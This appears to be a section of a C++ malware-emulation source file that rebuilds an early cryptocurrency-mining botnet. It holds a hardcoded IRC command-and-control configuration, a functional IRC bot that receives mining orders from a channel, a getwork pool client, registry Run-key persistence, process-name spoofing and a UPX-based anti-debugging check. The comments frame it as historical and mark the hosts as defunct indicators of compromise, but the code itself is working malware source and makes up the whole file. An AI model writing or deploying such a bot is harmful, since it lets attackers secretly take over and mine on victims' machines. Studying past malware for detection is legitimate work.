// ============================================================
// SECTION A: PAST INFRASTRUCTURE — IRC C2 + GETWORK PROTOCOL
// ============================================================

namespace Past {

// -------------------------------------------------------
// A.1 STATIC CONFIGURATION (as found in 2010-era miners)
//     Hardcoded IRC server, channel, wallet, pool
// -------------------------------------------------------
struct StaticConfig {
    const char* irc_server   = "irc.minercmd.ru";  // IOC (defunct)
    const int   irc_port     = 6667;
    const char* irc_channel  = "#bots";
    const char* irc_password = "minepass";
    const char* btc_wallet   = "1A1zP1eP5QGefi2DMPTfTL5SLmv7Divf"; // genesis addr
    const char* pool_host    = "pool.btcguild.com";  // IOC (defunct)
    const int   pool_port    = 8332;
    const char* worker_name  = "worker1";
    const char* worker_pass  = "x";
    const char* mutex_name   = "Global\\MinerMutex2011";
};

StaticConfig g_cfg;

// -------------------------------------------------------
// A.2 SIMPLE MUTEX — prevent re-infection (past technique)
// -------------------------------------------------------
HANDLE CreateSingleInstanceMutex(const char* name) {
    HANDLE hMutex = CreateMutexA(nullptr, TRUE, name);
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        return nullptr; // already running
    }
    return hMutex;
}

// -------------------------------------------------------
// A.3 IRC C2 CLIENT — functional TCP IRC bot
//     Connects, joins channel, parses PRIVMSG commands
//     Identical in structure to early Tidserv/Sirefef miners
// -------------------------------------------------------
class IRCBot {
public:
    SOCKET sock = INVALID_SOCKET;
    std::string nick;
    std::string channel;

    bool Connect(const char* server, int port) {
        WSADATA wsa;
        WSAStartup(MAKEWORD(2,2), &wsa);

        sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) return false;

        // DNS resolution
        addrinfo hints = {}, *res = nullptr;
        hints.ai_family   = AF_INET;
        hints.ai_socktype = SOCK_STREAM;
        char port_str[8];
        sprintf_s(port_str, "%d", port);

        if (getaddrinfo(server, port_str, &hints, &res) != 0) return false;

        if (connect(sock, res->ai_addr, (int)res->ai_addrlen) != 0) {
            freeaddrinfo(res);
            return false;
        }
        freeaddrinfo(res);
        return true;
    }

    void Send(const std::string& msg) {
        std::string line = msg + "\r\n";
        send(sock, line.c_str(), (int)line.size(), 0);
    }

    // Register with IRC server — plaintext, no auth
    void Register(const std::string& nickname, const std::string& pass) {
        nick    = nickname;
        channel = g_cfg.irc_channel;
        if (!pass.empty()) Send("PASS " + pass);
        Send("NICK " + nick);
        Send("USER " + nick + " 0 * :MinerBot");
    }

    void JoinChannel(const std::string& chan) {
        Send("JOIN " + chan);
    }

    // Parse incoming IRC line and extract pool config
    // Past bots received: PRIVMSG #bots :MINE pool_host:port wallet worker pass
    struct MiningCommand {
        std::string pool_host;
        int         pool_port = 8332;
        std::string wallet;
        std::string worker;
        std::string worker_pass;
        bool        valid = false;
    };

    MiningCommand ParseMINECommand(const std::string& line) {
        MiningCommand cmd;
        // Format: :nick!user@host PRIVMSG #bots :MINE host:port wallet worker pass
        size_t privmsg = line.find("PRIVMSG");
        if (privmsg == std::string::npos) return cmd;

        size_t colon = line.find(':', privmsg);
        if (colon == std::string::npos) return cmd;

        std::string payload = line.substr(colon + 1);
        if (payload.substr(0, 5) != "MINE ") return cmd;

        std::istringstream ss(payload.substr(5));
        std::string hostport;
        ss >> hostport >> cmd.wallet >> cmd.worker >> cmd.worker_pass;

        size_t colon_pos = hostport.find(':');
        if (colon_pos != std::string::npos) {
            cmd.pool_host = hostport.substr(0, colon_pos);
            cmd.pool_port = std::stoi(hostport.substr(colon_pos + 1));
        } else {
            cmd.pool_host = hostport;
        }
        cmd.valid = (!cmd.pool_host.empty() && !cmd.wallet.empty());
        return cmd;
    }

    // Main IRC event loop
    MiningCommand EventLoop() {
        char buf[4096];
        std::string remainder;
        while (true) {
            int received = recv(sock, buf, sizeof(buf) - 1, 0);
            if (received <= 0) break;
            buf[received] = 0;
            remainder += buf;

            size_t pos;
            while ((pos = remainder.find("\r\n")) != std::string::npos) {
                std::string line = remainder.substr(0, pos);
                remainder = remainder.substr(pos + 2);

                // Respond to PING
                if (line.substr(0, 4) == "PING") {
                    Send("PONG" + line.substr(4));
                    continue;
                }

                // Join channel on 001 (welcome)
                if (line.find(" 001 ") != std::string::npos) {
                    JoinChannel(g_cfg.irc_channel);
                    continue;
                }

                auto cmd = ParseMINECommand(line);
                if (cmd.valid) return cmd;
            }
        }
        return {};
    }

    ~IRCBot() {
        if (sock != INVALID_SOCKET) closesocket(sock);
        WSACleanup();
    }
};

// -------------------------------------------------------
// A.4 GETWORK PROTOCOL CLIENT (obsolete, used ~2010-2012)
//     HTTP JSON-RPC polling for work units
// -------------------------------------------------------
std::string GetworkRequest(const std::string& host, int port,
                            const std::string& user, const std::string& pass) {
    // Build HTTP Basic Auth header
    std::string creds = user + ":" + pass;

    // Base64 encode credentials
    DWORD b64_len = 0;
    CryptBinaryToStringA(
        (const BYTE*)creds.c_str(), (DWORD)creds.size(),
        CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
        nullptr, &b64_len);
    std::string b64(b64_len, 0);
    CryptBinaryToStringA(
        (const BYTE*)creds.c_str(), (DWORD)creds.size(),
        CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
        b64.data(), &b64_len);
    b64.resize(b64_len);

    std::string body = R"({"method":"getwork","params":[],"id":1})";

    std::string request =
        "POST / HTTP/1.1\r\n"
        "Host: " + host + "\r\n"
        "Authorization: Basic " + b64 + "\r\n"
        "Content-Type: application/json\r\n"
        "Content-Length: " + std::to_string(body.size()) + "\r\n"
        "Connection: close\r\n"
        "\r\n" + body;

    // Send over raw TCP socket
    WSADATA wsa;
    WSAStartup(MAKEWORD(2,2), &wsa);
    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    addrinfo hints = {}, *res = nullptr;
    hints.ai_family   = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    char ps[8]; sprintf_s(ps, "%d", port);
    getaddrinfo(host.c_str(), ps, &hints, &res);
    connect(s, res->ai_addr, (int)res->ai_addrlen);
    freeaddrinfo(res);

    send(s, request.c_str(), (int)request.size(), 0);

    std::string response;
    char rbuf[8192];
    int n;
    while ((n = recv(s, rbuf, sizeof(rbuf)-1, 0)) > 0) {
        rbuf[n] = 0;
        response += rbuf;
    }
    closesocket(s);
    WSACleanup();
    return response;
}

// -------------------------------------------------------
// A.5 PAST PERSISTENCE — Registry Run Key
//     Simple, detected by all modern AV within days
// -------------------------------------------------------
bool InstallRegistryPersistence(const char* value_name, const char* exe_path) {
    HKEY hKey;
    LONG result = RegOpenKeyExA(
        HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey);
    if (result != ERROR_SUCCESS) return false;

    result = RegSetValueExA(
        hKey, value_name, 0, REG_SZ,
        (const BYTE*)exe_path,
        (DWORD)(strlen(exe_path) + 1));
    RegCloseKey(hKey);
    return (result == ERROR_SUCCESS);
}

// -------------------------------------------------------
// A.6 PAST PROCESS NAME SPOOFING (string-level only)
//     Rename argv[0]; no actual process hollowing
// -------------------------------------------------------
void SpoofProcessName(char* argv0, const char* target_name) {
    // Overwrite argv[0] in place — works on Linux; Windows ignores it
    strncpy(argv0, target_name, strlen(argv0));
}

// -------------------------------------------------------
// A.7 PAST ANTI-AV: UPX self-check stub
//     Early miners simply used UPX; some checked UPX header
//     to detect if unpacked (indicating sandbox/manual unpack)
// -------------------------------------------------------
bool IsUpxPacked() {
    // Check for UPX magic in own PE header — used by early miners
    // to refuse to run if already unpacked (debugging detection)
    HMODULE base = GetModuleHandleA(nullptr);
    if (!base) return false;

    const BYTE* raw = reinterpret_cast<const BYTE*>(base);
    // UPX0 section name appears at offset ~0x1A8 in typical UPX-packed PE
    // We scan first 0x400 bytes for 'UPX' signature
    for (int i = 0; i < 0x400 - 3; i++) {
        if (raw[i]=='U' && raw[i+1]=='P' && raw[i+2]=='X') return true;
    }
    return false;
}

